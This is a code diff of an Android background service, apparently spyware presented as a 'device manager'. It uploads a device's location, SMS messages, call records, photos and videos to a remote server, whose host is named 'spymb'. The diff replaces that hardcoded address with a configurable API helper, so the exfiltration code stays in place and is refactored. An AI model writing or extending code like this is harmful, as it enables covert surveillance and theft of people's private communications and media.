@@ -153,7 +153,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 			body.put("type", "telemetry");
 			body.put("payload", payload);
 			
-			String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+			String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
 			try {
 				String res = com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
 				Log.d(TAG, "telemetry response: " + res);
@@ -185,7 +185,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 				JSONObject body = new JSONObject();
 				body.put("type", "telemetry");
 				body.put("payload", payload);
-				String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+				String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
 				com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
 				} catch (Exception e) {
 				Log.e(TAG, "onLocationChanged send err", e);
@@ -241,7 +241,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 					JSONObject body = new JSONObject();
 					body.put("type", "sms");
 					body.put("payload", payload);
-					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+					String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
 					try { com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token); } catch (Exception e) { Log.e(TAG, "sms send err", e); }
 				} catch (Exception e) { Log.e(TAG, "sms item err", e); }
 			}
@@ -275,7 +275,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 					JSONObject body = new JSONObject();
 					body.put("type", "call");
 					body.put("payload", payload);
-					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+					String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
 					try { com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token); } catch (Exception e) { Log.e(TAG, "call send err", e); }
 				} catch (Exception e) { Log.e(TAG, "call item err", e); }
 			}
@@ -331,7 +331,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 						if (hash == null) continue;
 						if (uploaded.contains(hash)) continue;
 						String filename = "img_" + id + (mime != null && mime.contains("/") ? ("." + mime.substring(mime.indexOf("/") + 1)) : ".jpg");
-						String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
+						String url = com.company.devicemgr.utils.ApiConfig.api("/api/media/" + deviceId + "/upload");
 						String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, data, mime, token);
 						try {
 							JSONObject jr = new JSONObject(resp);
@@ -363,7 +363,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 						if (hash == null) continue;
 						if (uploaded.contains(hash)) continue;
 						String filename = "vid_" + id + (mime != null && mime.contains("/") ? ("." + mime.substring(mime.indexOf("/") + 1)) : ".mp4");
-						String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
+						String url = com.company.devicemgr.utils.ApiConfig.api("/api/media/" + deviceId + "/upload");
 						String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, data, mime, token);
 						try {
 							JSONObject jr = new JSONObject(resp);
